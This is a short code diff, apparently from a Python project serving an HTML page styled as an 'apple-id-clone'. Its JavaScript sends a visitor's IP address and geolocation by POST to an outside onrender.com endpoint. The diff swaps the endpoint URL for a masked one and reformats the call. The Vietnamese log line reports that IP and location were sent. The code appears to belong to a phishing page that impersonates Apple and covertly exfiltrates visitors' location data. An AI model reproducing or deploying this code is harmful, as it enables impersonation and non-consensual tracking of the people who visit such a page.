@@ -128,12 +128,12 @@ HTML_PAGE = '''
           longitude: data.longitude
         };
 
- await fetch('https://apple-id-clone-luon.onrender.com/submit', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
+ await fetch('https://apple-id-xxxxx.onrender.com/submit', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(payload)
         });
 
         console.log("✅ IP & vị trí đã gửi:", payload);
